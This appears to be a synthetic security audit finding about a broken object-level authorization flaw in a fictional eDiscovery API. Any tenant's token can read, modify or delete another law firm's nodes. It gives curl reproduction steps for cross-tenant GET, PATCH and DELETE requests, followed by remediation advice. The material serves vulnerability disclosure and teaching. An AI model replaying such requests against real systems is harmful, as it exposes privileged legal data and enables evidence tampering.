## System

- System: LexVault eDiscovery API v5.8.0
- Domain: LEGAL TECH / DOCUMENT MANAGEMENT
- Example ID: BOLA-0074
- Risk ID: RISK-25-074

## Findings

### 1. Pattern 2.5 — Critical Infrastructure Interface Exposure on `/api/v3/nodes/:id` (HAR Primary)

**HAR evidence**: JWT `X-Tenant-ID: ORG-6831`. Request: `GET /api/v3/nodes/NOD-2074`. Response: HTTP 200 OK with `"tenantId": "ORG-36D5"`, `"sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-36D5"`.

**Pattern 2.5 (BAC — Critical Infrastructure Interface Exposure)**: the `/api/v3/nodes` endpoint exposes an eDiscovery infrastructure management interface without tenant-enforced access controls. `nodes` represent critical eDiscovery processing nodes — case documents submitted to discovery, litigation repository nodes, or evidence collection containers. Exposure of this interface to unauthorized parties allows a competing law firm (`ORG-6831`) to access, modify, or delete the eDiscovery node infrastructure of another firm (`ORG-36D5`).

Section 4.0 confirms: the backend queries by `node_id` only, without filtering by `owner_id` or `tenant_id`. Section 3.0 database schema: "Application code does NOT use tenant_id in authorization checks."

**Legal Tech impact**: `sensitive_data` in eDiscovery nodes contains litigation-critical information (document metadata, privilege designations, case identifiers). Unauthorized access constitutes a breach of attorney-client privilege. Write access (PATCH/DELETE) to another firm's nodes could constitute evidence tampering or obstruction of justice.

### 2. Write Access Escalation via PATCH/DELETE (Pattern 2.5 Extension)

Section 4.0: "GET/PATCH/DELETE `/api/v3/nodes/:id`" — all three verbs use the same unguarded handler. The critical infrastructure exposure extends to modification and deletion of another firm's eDiscovery nodes.

## Evidence

- **HAR**: `GET /api/v3/nodes/NOD-2074` with `ORG-6831` JWT → HTTP 200 → `tenantId: ORG-36D5` with `sensitiveData`.
- **Section 4.0 (RISK-25-074)**: Pattern 2.5 in `/api/v3/nodes` handler — GET/PATCH/DELETE lack tenant/owner filter.
- **Section 3.0**: Database schema comment confirms no `tenant_id` authorization check.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.lexvault-edisco.example.com/api/v3/nodes/NOD-1074" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-6831>" \
  -H "X-Tenant-ID: ORG-6831"
```

Expected: `tenantId: "ORG-6831"`.

**Step 2 — Critical infrastructure interface exposure: read cross-tenant eDiscovery node (primary HAR attack):**

```bash
curl -s "https://api.lexvault-edisco.example.com/api/v3/nodes/NOD-2074" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-6831>" \
  -H "X-Tenant-ID: ORG-6831"
```

Expected secure: HTTP 403 or 404.  
Expected vulnerable: HTTP 200 with `tenantId: "ORG-36D5"` and `sensitiveData`.

**Step 3 — Write escalation: tamper with cross-tenant eDiscovery node (Pattern 2.5 critical write):**

```bash
curl -s -X PATCH "https://api.lexvault-edisco.example.com/api/v3/nodes/NOD-2074" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-6831>" \
  -H "X-Tenant-ID: ORG-6831" \
  -H "Content-Type: application/json" \
  -d '{"status": "suspended", "sensitive_data": "tampered_evidence_node"}'
```

Expected secure: HTTP 403.  
Expected vulnerable: HTTP 200 — another law firm's eDiscovery node modified, potentially corrupting litigation evidence.

**Step 4 — Delete escalation:**

```bash
curl -s -X DELETE "https://api.lexvault-edisco.example.com/api/v3/nodes/NOD-2074" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-6831>" \
  -H "X-Tenant-ID: ORG-6831"
```

## Remediation

- **Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub`** to GET/PATCH/DELETE handlers for `/api/v3/nodes` (RISK-25-074, blocking DB migration #DB-174).
- **Privilege check before write/delete**: verify `status` transitions are authorized by the owning tenant only.
- **Centralise authorization middleware**: eDiscovery infrastructure node interfaces must enforce stricter access controls than standard CRUD APIs.
- **Regression test**: Tenant A token accesses Tenant B `node_id` via GET, PATCH, DELETE — assert HTTP 403/404.
